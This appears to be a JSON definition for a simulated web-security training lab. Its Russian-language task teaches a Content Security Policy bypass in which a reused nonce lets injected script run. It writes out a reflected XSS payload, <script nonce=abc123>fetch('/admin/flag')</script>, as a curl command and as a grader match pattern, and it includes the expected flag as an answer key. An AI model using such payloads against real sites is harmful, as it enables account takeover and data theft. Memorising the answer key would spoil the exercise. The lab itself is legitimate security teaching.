@@ -1,0 +1,21 @@
+{
+  "id": "web-csp-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{c5p_n0nc3_r3us3_byp4ss}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: CSP advanced — nonce reuse\n\n`shop.local` ставит строгий CSP с `nonce` и `strict-dynamic`. Но тот же\nnonce переиспользуется в отражённом параметре — инъекция выполнится.\n\n1. Снимаем и раскладываем CSP:\n\n   curl -sI https://shop.local/\n\n2. Nonce утекает в отражение — пробуем инъекцию с этим nonce:\n\n   curl -s 'https://shop.local/search?q=<script nonce=abc123>fetch(\"/admin/flag\")</script>' > found.txt\n\n3. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local с CSP)",
+      "cases": [
+        { "match": "<script|nonce=abc123|fetch|/admin/flag", "example": "-s 'https://shop.local/search?q=<script nonce=abc123>fetch(\"/admin/flag\")</script>'", "output": "<div>Результаты по запросу: <script nonce=abc123>fetch(\"/admin/flag\")</script></div>\n[CSP] script-src 'nonce-abc123' 'strict-dynamic' — nonce reused, inline executed\n[/admin/flag] -> nto{c5p_n0nc3_r3us3_byp4ss}\n" },
+        { "match": "-sI|-I|--head", "example": "-sI https://shop.local/", "output": "HTTP/1.1 200 OK\nContent-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'; object-src 'none'; base-uri 'none'\nServer: nginx\n" },
+        { "match": "shop\\.local", "example": "-s https://shop.local/", "output": "<!doctype html><title>shop</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется shop.local с CSP.\n"
+    }
+  }
+}
